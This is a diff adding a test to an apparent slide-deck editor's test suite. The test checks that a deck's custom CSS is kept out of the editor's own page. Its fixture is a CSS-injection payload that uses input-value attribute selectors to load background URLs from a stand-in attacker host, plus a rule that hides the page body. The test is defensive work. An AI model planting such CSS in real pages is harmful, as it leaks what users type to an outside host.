@@ -300,3 +300,21 @@ describe('the editor, live', () => {
     expect(el.querySelector('[role="alert"]')).toBeNull()
   })
 })
+
+describe('a deck’s custom CSS', () => {
+  it('stays out of the editor’s own page', async () => {
+    // A collaborator's, reaching for what's typed into the editor's fields
+    const css = 'input[value^="a"] { background: url(https://evil.example/a) } body { display: none }'
+    saved.customCSS = css
+    try {
+      await open({ arrive: false })
+      await later(10000) // no live connection: the deck as saved, which has it
+      expect(titleInput().value).toBe('Saved title')
+      const styles = [...document.querySelectorAll('style')].map(s => s.textContent).join('\n')
+      expect(styles).not.toContain('evil.example')
+      expect(styles).not.toContain('display: none }')
+    } finally {
+      delete saved.customCSS
+    }
+  })
+})
